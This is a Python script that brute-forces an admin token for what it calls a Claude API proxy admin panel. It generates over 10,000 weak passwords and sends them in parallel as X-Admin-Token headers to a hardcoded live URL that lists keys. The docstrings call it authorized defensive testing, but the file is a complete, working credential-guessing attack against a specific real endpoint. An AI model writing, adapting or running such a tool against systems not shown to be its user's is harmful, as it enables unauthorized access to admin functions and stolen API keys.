#!/usr/bin/env python3
"""
Admin token brute-force demo (parallel, 10k passwords)

WARNING: Use only against systems you own or have explicit permission to test.
This script sends real HTTP requests to the admin endpoint and tries a large
list of common weak admin tokens in parallel. If any token returns HTTP 200,
the admin panel is vulnerable to brute-force.

Purpose: defensive security testing for the Claude API proxy admin panel.
"""

import argparse
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List

import requests

DEFAULT_URL = "https://claude-code-cli.vibecode-claude.online/manage/keys/list"
DEFAULT_TIMEOUT = 10
DEFAULT_THREADS = 5


def generate_tokens() -> List[str]:
    """Generate 10,000+ common weak passwords/tokens for security testing."""
    tokens = set()

    # ── Base words ──
    base_words = [
        "admin", "administrator", "adminadmin", "root", "toor", "test",
        "guest", "user", "super", "superadmin", "support", "demo", "demo1",
        "api", "apikey", "key", "changeme", "default", "temp", "tempadmin",
        "backup", "server", "serveradmin", "system", "sysadmin", "manager",
        "operator", "service", "monitor", "config", "setup", "install",
        "update", "upgrade", "security", "secure", "debug", "network",
        "cloud", "cloudflare", "nginx", "docker", "redis", "mysql",
        "postgres", "mongo", "oracle", "jenkins", "gitlab", "github",
        "aws", "azure", "gcp", "kubernetes", "proxy", "proxyadmin",
        "token", "secret", "password", "passw0rd", "passwd", "login",
        "access", "hello", "welcome", "master", "shadow", "dragon",
        "monkey", "batman", "killer", "hunter", "ranger", "buster",
        "charlie", "donald", "michael", "daniel", "thomas", "richard",
        "robert", "william", "james", "john", "alex", "alexey", "andrew",
        "joshua", "matthew", "anthony", "jordan", "maggie", "ashley",
        "jessica", "jennifer", "nicole", "pepper", "ginger", "flower",
        "summer", "winter", "spring", "autumn", "freedom", "matrix",
        "mustang", "corvette", "ferrari", "porsche", "harley", "tigger",
        "soccer", "hockey", "baseball", "football", "starwars", "startrek",
        "whatever", "trustno1", "letmein", "sunshine", "princess",
        "iloveyou", "hacker", "hackme", "qwerty", "qweasd", "abcdef",
        "abc", "vibecode", "vibe", "claude", "claudeadmin", "anthropic",
        "cap", "cap_admin", "maintenance",
    ]

    # ── Suffixes ──
    suffixes = [
        "", "1", "12", "123", "1234", "12345", "123456", "1234567",
        "12345678", "123456789", "1234567890", "!", "!!", "123!",
        "1!", "12!", "@123", "@1234", "#123", "$123", "@1", "@12",
        "2024", "2025", "2026", "2023", "2022", "2021", "2020",
        "01", "02", "03", "04", "05", "06", "07", "08", "09", "00",
        "11", "22", "33", "44", "55", "66", "77", "88", "99",
        "111", "222", "333", "444", "555", "666", "777", "888", "999",
        "000", "321", "456", "789", "0", "01", "007",
        "admin", "pass", "password", "token", "key", "test",
        "qwe", "asd", "zxc", "abc", "xyz",
    ]

    # ── Generate base × suffix combinations ──
    for word in base_words:
        for suffix in suffixes:
            tokens.add(word + suffix)
            tokens.add(word.capitalize() + suffix)
            tokens.add(word.upper() + suffix)

    # ── Pure number sequences (0-9999) ──
    for i in range(0, 10000):
        tokens.add(str(i))
    for i in range(0, 100):
        tokens.add(str(i) * 2)
        tokens.add(str(i) * 3)
        tokens.add(str(i) * 4)

    # ── Keyboard patterns ──
    patterns = [
        "qwerty", "qwertyuiop", "asdfgh", "asdfghjkl", "zxcvbn",
        "zxcvbnm", "qweasdzxc", "qwerty123", "qwerty1", "qwerty12",
        "qwerty1234", "qwerty!", "1qaz2wsx", "1q2w3e4r", "1q2w3e",
        "1q2w3e4r5t", "zaq1zaq1", "qazwsx", "qazwsxedc", "qweasd",
        "qweasdzxc", "qweasdzxc123", "!@#$%^&*", "!@#$%",
        "poiuytrewq", "lkjhgfdsa", "mnbvcxz",
    ]
    for p in patterns:
        tokens.add(p)
        tokens.add(p + "123")
        tokens.add(p + "1")
        tokens.add(p + "!")

    # ── Common rockyou-style passwords ──
    common = [
        "password", "password1", "password12", "password123",
        "password1234", "password12345", "password123456",
        "password!", "password@123", "password1!", "passw0rd",
        "passw0rd1", "passw0rd123", "passwd", "passwd123",
        "pass123", "pass1234", "pass12345", "p@ssword", "p@ssw0rd",
        "p@ss123", "p@ss", "p@ss1", "p@ss12", "p@ss1234",
        "123456", "1234567", "12345678", "123456789", "1234567890",
        "123456789a", "123456a", "123456abc", "123456abc1",
        "12345", "1234561", "12345612", "123456123", "1234561234",
        "12345612345", "123456123456", "123321", "123123", "123123123",
        "1234", "12345a", "1234561a", "12345678a", "123456789a",
        "111111", "11111111", "111111111", "1111111111",
        "000000", "00000000", "000000000", "0000000000",
        "666666", "66666666", "666666666", "6666666666",
        "777777", "77777777", "777777777", "7777777777",
        "888888", "88888888", "888888888", "8888888888",
        "999999", "99999999", "999999999", "9999999999",
        "abc123", "abc1234", "abc12345", "abc123456",
        "abcdef", "abcdef1", "abcdef12", "abcdef123",
        "letmein", "letmein123", "letmein1", "letmein!",
        "welcome", "welcome1", "welcome123", "welcome!",
        "monkey", "monkey123", "monkey1", "monkey!",
        "dragon", "dragon123", "dragon1", "dragon!",
        "master", "master123", "master1", "master!",
        "login", "login123", "login1", "login!",
        "princess", "princess123", "princess1",
        "football", "football123", "football1",
        "shadow", "shadow123", "shadow1", "shadow!",
        "sunshine", "sunshine123", "sunshine1",
        "trustno1", "trustno1!", "trustno123",
        "iloveyou", "iloveyou123", "iloveyou1",
        "batman", "batman123", "batman1", "batman!",
        "access", "access123", "access1", "access!",
        "hello", "hello123", "hello1", "hello!",
        "charlie", "charlie123", "charlie1",
        "secret", "secret123", "secret1", "secret!",
        "changeme", "changeme123", "changeme1",
        "whatever", "whatever123", "whatever1",
        "baseball", "baseball123", "baseball1",
        "michael", "michael123", "michael1",
        "daniel", "daniel123", "daniel1",
        "thomas", "thomas123", "thomas1",
        "summer", "summer123", "summer1",
        "winter", "winter123", "winter1",
        "george", "george123", "george1",
        "andrew", "andrew123", "andrew1",
        "joshua", "joshua123", "joshua1",
        "harley", "harley123", "harley1",
        "ranger", "ranger123", "ranger1",
        "buster", "buster123", "buster1",
        "tigger", "tigger123", "tigger1",
        "merlin", "merlin123", "merlin1",
        "soccer", "soccer123", "soccer1",
        "hockey", "hockey123", "hockey1",
        "andrea", "andrea123", "andrea1",
        "maggie", "maggie123", "maggie1",
        "starwars", "starwars123", "starwars1",
        "pepper", "pepper123", "pepper1",
        "ginger", "ginger123", "ginger1",
        "flower", "flower123", "flower1",
        "hacker", "hacker123", "hacker1",
        "hackme", "hackme123", "hackme1",
    ]
    for c in common:
        tokens.add(c)

    # ── Deduplicate and return as list ──
    return list(tokens)


def test_endpoint(url: str, tokens: List[str], timeout: int, threads: int) -> bool:
    """
    Try each token against the admin endpoint in parallel.
    Stops immediately if a valid token is found.
    Returns True if a valid token is found, False otherwise.
    """
    print("=" * 60)
    print("ADMIN TOKEN ENDPOINT TESTER (parallel)")
    print("=" * 60)
    print(f"Target URL:      {url}")
    print(f"Tokens to test:  {len(tokens):,}")
    print(f"Threads:         {threads}")
    print(f"Timeout:         {timeout}s")
    print()
    print("This checks whether the admin endpoint accepts a weak token.")
    print("If HTTP 200 appears below, the token is weak and must be changed.")
    print()

    stop_event = threading.Event()
    found_token = [None]
    tested = [0]
    tested_lock = threading.Lock()
    start_time = time.time()

    # One Session per thread for TCP connection reuse
    thread_local = threading.local()

    def get_session() -> requests.Session:
        if not hasattr(thread_local, "session"):
            thread_local.session = requests.Session()
        return thread_local.session

    def try_token(token: str) -> bool:
        if stop_event.is_set():
            return False

        headers = {
            "X-Admin-Token": token,
            "User-Agent": "admin-token-tester/1.0 (defensive-test)",
        }

        try:
            session = get_session()
            resp = session.get(url, headers=headers, timeout=timeout)
            with tested_lock:
                tested[0] += 1
                count = tested[0]

            if count % 100 == 0:
                elapsed = time.time() - start_time
                rate = count / elapsed if elapsed > 0 else 0
                print(f"  ... {count}/{len(tokens)} tested, {rate:.0f}/s, no hit yet")

            if resp.status_code == 200:
                with tested_lock:
                    if found_token[0] is not None:
                        return False
                    found_token[0] = token
                stop_event.set()
                print(f"\n[{count}/{len(tokens)}] token='{token}' -> HTTP 200")
                print(f"\nFOUND: token '{token}' is valid!")
                print("The admin panel is vulnerable to brute-force.")
                print("Action: change the admin token to a strong random value immediately.")
                return True
            elif resp.status_code == 403:
                stop_event.set()
                print(f"\n[{count}/{len(tokens)}] token='{token}' -> HTTP 403")
                print("Cloudflare/WAF blocked the request.")
                print("This is good: rate limiting or WAF is active.")
                return False

        except requests.exceptions.Timeout:
            with tested_lock:
                tested[0] += 1
        except requests.exceptions.ConnectionError:
            with tested_lock:
                tested[0] += 1
        except requests.exceptions.RequestException:
            with tested_lock:
                tested[0] += 1

        return False

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(try_token, t): t for t in tokens}
        try:
            for future in as_completed(futures):
                if stop_event.is_set():
                    break
                future.result()
        finally:
            # cancel_futures only exists in Python 3.9+
            try:
                executor.shutdown(wait=False, cancel_futures=True)
            except TypeError:
                executor.shutdown(wait=False)

    elapsed = time.time() - start_time
    print(f"\nFinished: {tested[0]:,}/{len(tokens):,} tested in {elapsed:.1f}s")
    return found_token[0] is not None


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Parallel admin token endpoint tester. "
                    "For authorized defensive testing only."
    )
    parser.add_argument(
        "--url",
        default=DEFAULT_URL,
        help=f"Admin endpoint URL (default: {DEFAULT_URL})",
    )
    parser.add_argument(
        "--token-list",
        help="Path to a file with one token per line (default: built-in 10k generator).",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help=f"Request timeout in seconds (default: {DEFAULT_TIMEOUT}).",
    )
    parser.add_argument(
        "--threads",
        type=int,
        default=DEFAULT_THREADS,
        help=f"Number of parallel threads (default: {DEFAULT_THREADS}).",
    )
    args = parser.parse_args()

    if args.token_list:
        with open(args.token_list, "r", encoding="utf-8") as f:
            tokens = [line.strip() for line in f if line.strip()]
    else:
        print("Generating password list...")
        tokens = generate_tokens()
        print(f"Generated {len(tokens):,} unique tokens.\n")

    found = test_endpoint(args.url, tokens, args.timeout, args.threads)

    print("\n" + "=" * 60)
    if found:
        print("RESULT: VULNERABLE — weak admin token found.")
    else:
        print("RESULT: No weak token found in the test list.")
        print("If the real token is strong, the panel is safe from simple guessing.")
        print("Still recommended: add IP whitelist and rate limiting on /manage/*.")
    print("=" * 60)


if __name__ == "__main__":
    main()
